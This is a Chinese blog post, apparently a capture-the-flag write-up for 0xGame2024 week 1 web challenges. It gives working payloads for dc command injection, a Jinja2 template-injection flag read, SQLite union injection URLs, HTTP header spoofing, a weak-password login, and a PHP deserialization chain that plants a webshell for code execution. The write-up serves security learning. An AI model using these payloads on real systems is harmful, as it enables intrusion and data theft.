@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    
+    <meta charset="UTF-8">
+    <title>0xGame2024 week1 - N0tluS.site</title>
+    <link rel="shortcut icon" href="/static/img/icon.png">
+    <link rel="icon" href="/static/img/icon.png" sizes="192x192"/>
+    
+<link rel="stylesheet" href="/static/kico.css">
+<link rel="stylesheet" href="/static/hingle.css">
+
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <meta property="og:site_name" content="N0tluS.site">
+    <meta property="og:title" content="0xGame2024 week1"/>
+    
+    <style>body:before{ content: ''; background-image: url(https://api.paugram.com/wallpaper?source=gh) }</style>
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    <header>
+    <div class="head-title">
+        <h4>N0tluS.site</h4>
+    </div>
+    <div class="head-action">
+        <div class="toggle-btn"></div>
+        <div class="light-btn"></div>
+        <div class="search-btn"></div>
+    </div>
+    <form class="head-search" method="post">
+        <input type="text" name="s" placeholder="搜索什么？">
+    </form>
+    <nav class="head-menu">
+        <a href="/">首页</a>
+        <div class="has-child">
+            <a href>分类</a>
+            <div class="sub-menu">
+                <a class="category-link" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a><a class="category-link" href="/categories/wp/">wp</a>
+            </div>
+        </div>
+        
+            <a href="/about">关于我</a>
+        
+    </nav>
+</header>
+
+    <main>
+    <div class="wrap min">
+        <section class="post-title">
+            <h2>0xGame2024 week1</h2>
+            <div class="post-meta">
+                <time class="date">2024.10.24</time>
+            
+                <span class="category"><a class="category-link" href="/categories/wp/">wp</a></span>
+            
+            </div>
+        </section>
+        <article class="post-content">
+        
+            <h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="ez-rce"><a href="#ez-rce" class="headerlink" title="ez_rce"></a>ez_rce</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculator</span>():</span><br><span class="line">    expression = request.form.get(<span class="string">&#x27;expression&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;114 1000 * 514 + p&quot;</span></span><br><span class="line">    result = subprocess.run([<span class="string">&quot;dc&quot;</span>, <span class="string">&quot;-e&quot;</span>, expression], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> result.stdout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>问题是如何利用dc进行命令执行，直接翻文档<a target="_blank" rel="noopener" href="https://www.gnu.org/software/bc/manual/dc-1.05/html_mono/dc.html">dc，任意精度计算器 (gnu.org)</a></p>
+<blockquote>
+<p>&#96;!’</p>
+<p>Will run the rest of the line as a system command. Note that parsing of the !&lt;, !&#x3D;, and !&gt; commands take precidence, so if you want to run a command starting with &lt;, &#x3D;, or &gt; you will need to add a space after the !.</p>
+</blockquote>
+<p>大概就是会把<code>!</code>后面的东西作为系统命令执行</p>
+<img src="/2024/10/24/0xGame2024-week1/image-20241006115600422-17297644455811.png" class="" title="image-20241006115600422">
+
+<h2 id="ez-login"><a href="#ez-login" class="headerlink" title="ez_login"></a>ez_login</h2><p>弱口令<code>username=admin&amp;password=admin123</code></p>
+<h2 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h2><p>第一段flag查看源码<code>0xGame&#123;ee7f2040-1987-4e0a </code>，第二段flag抓<code>f14g.php</code>的包<code>-872d-68589c4ab3d3&#125;</code></p>
+<p><code>0xGame&#123;ee7f2040-1987-4e0a-872d-68589c4ab3d3&#125;</code></p>
+<h2 id="hello-http"><a href="#hello-http" class="headerlink" title="hello_http"></a>hello_http</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?hello=world</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>8.130.84.100:50002</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>x1cBrowser</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8080/</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>flag=secret</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>12</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">web</span><span class="operator">=</span>security</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ez-ssti"><a href="#ez-ssti" class="headerlink" title="ez_ssti"></a>ez_ssti</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag=os.getenv(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">os.unsetenv(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="built_in">print</span>(request.root_url)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;&lt;h1&gt;The Url &#123;&#125; You Requested Can Not Found&lt;/h1&gt;&quot;</span>.<span class="built_in">format</span>(request.url))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>环境变量里的flag删掉了，但是存在了自定义变量<code>flag</code>里，<code>import</code>导入main.py后读flag</p>
+<p><code>&#123;&#123;x.__init__.__globals__.__builtins__.__import__("main").flag&#125;&#125;</code></p>
+<h2 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h2><p>sqlite数据库，和mysql的注入有些差别，参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8627">https://xz.aliyun.com/t/8627</a></p>
+<p><code>http://47.76.151.192:60080/?id=1 order by 6</code>网页会报500，所以确定数据库有五列</p>
+<img src="/2024/10/24/0xGame2024-week1/image-20241006193334426-17297644455822.png" class="" title="image-20241006193334426">
+
+<p><code>http://47.76.151.192:60080/?id=1%20union%20select%201,2,3,4,sql%20from%20sqlite_master</code>拿到表名和字段名</p>
+<img src="/2024/10/24/0xGame2024-week1/image-20241006193639517-17297644455823.png" class="" title="image-20241006193639517">
+
+<p><code>http://47.76.151.192:60080/?id=1%20union%20select%201,2,3,4,flag%20from%20flag</code>查询flag</p>
+<img src="/2024/10/24/0xGame2024-week1/image-20241006193722074-17297644455824.png" class="" title="image-20241006193722074">
+
+<h2 id="ez-unser"><a href="#ez-unser" class="headerlink" title="ez_unser"></a>ez_unser</h2><p>分两次打，第一次把一句话木马写入log文件中，第二次再把log文件重命名为php文件，最后rce</p>
+<p>POC如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//error_reporting(0);</span></span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Man</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>=<span class="string">&quot;原神，启动&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$var</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">str_split</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">What</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Kun</span>=<span class="string">&quot;两年半&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Kun=<span class="variable">$var</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;Kun-&gt;hobby;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Ok&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Can</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Hobby</span>=<span class="string">&quot;唱跳rap篮球&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Hobby=<span class="variable">$var</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;Hobby);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">I</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>=<span class="string">&quot;Kobe&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="variable">$var</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__debugInfo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Say</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$evil</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;evil=<span class="variable">$var</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;evil-&gt;<span class="title function_ invoke__">Evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mamba</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Evil</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="title function_ invoke__">time</span>().<span class="string">&quot;.log&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$_POST</span>[<span class="string">&quot;content&quot;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Out</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$o</span> = <span class="string">&quot;./&quot;</span>.<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;第五人格&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&quot;o&quot;</span>]);</span><br><span class="line">        <span class="variable">$n</span> = <span class="variable">$_POST</span>[<span class="string">&quot;n&quot;</span>];</span><br><span class="line">        <span class="title function_ invoke__">rename</span>(<span class="variable">$o</span>,<span class="variable">$n</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;!!!!!make it&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//$man=new Man(new What(new Can(new I(new Say(new Mamba())))));//step1</span></span><br><span class="line"><span class="variable">$man</span>=<span class="keyword">new</span> <span class="title class_">Man</span>(<span class="keyword">new</span> <span class="title class_">What</span>(<span class="keyword">new</span> <span class="title class_">Can</span>(<span class="keyword">new</span> <span class="title function_ invoke__">I</span>(<span class="keyword">new</span> <span class="title class_">Out</span>()))));<span class="comment">//step2</span></span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$man</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$man</span>));</span><br></pre></td></tr></table></figure>
+
+<img src="/2024/10/24/0xGame2024-week1/image-20241006210904905-17297644455825.png" class="" title="image-20241006210904905">
+
+<img src="/2024/10/24/0xGame2024-week1/image-20241006210927957-17297644455826.png" class="" title="image-20241006210927957">
+
+<img src="/2024/10/24/0xGame2024-week1/image-20241006210954018-17297644455837.png" class="" title="image-20241006210954018">
+
+
+        </article>
+        <section class="post-near">
+            <ul>
+                
+                    <li>上一篇: <a href="/2024/10/24/0xGame2024-week2/">0xGame2024 week2</a></li>
+                
+                
+                    <li>下一篇: <a href="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/">Java反序列化之CB1</a></li>
+                
+            </ul>
+        </section>
+        
+            <section class="post-tags">
+            <a class="-none-link" href="/tags/wp/" rel="tag">wp</a>
+            </section>
+        
+    
+        <section class="post-author">
+        
+            <figure class="author-avatar">
+                <img src="https://gravatar.com/deepestcollectionebe5c8dd66" alt="N0tluS" />
+            </figure>
+        
+            <div class="author-info">
+                <h4>N0tluS</h4>
+                <p>ovo</p>
+            </div>
+        </section>
+    
+    </div>
+</main>
+
+    <footer>
+    <div class="buttons">
+        <button class="to-top" href="#"></button>
+    </div>
+    <div class="wrap min">
+        <section class="widget">
+            <div class="row">
+                <div class="col-m-4">
+                    <h3 class="title-recent">最新文章：</h3>
+                    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2024/10/24/0xGame2024-week2/">0xGame2024 week2</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/10/24/0xGame2024-week1/">0xGame2024 week1</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/09/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCB1/">Java反序列化之CB1</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/09/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC11/">Java反序列化之CC11</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/09/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE/">Java反序列化之CC链</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-date">时光机：</h3>
+                    <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li></ul>
+                </div>
+                <div class="col-m-4">
+                    <h3 class="title-tags">标签云：</h3>
+                    <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Java安全</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a>
+                </div>
+            </div>
+        </section>
+        <section class="sub-footer">
+            <p>© 2024 <a href="/">N0tluS.site</a>. All Rights Reserved. Theme By <a href="https://github.com/Dreamer-Paul/Hingle" target="_blank" rel="nofollow">Hingle</a>.</p>
+        </section>
+    </div>
+</footer>
+
+
+<script src="/static/kico.js"></script>
+<script src="/static/hingle.js"></script>
+
+
+<script>var hingle = new Paul_Hingle({"copyright":false,"night":true});</script>
+
+  </body>
+</html>
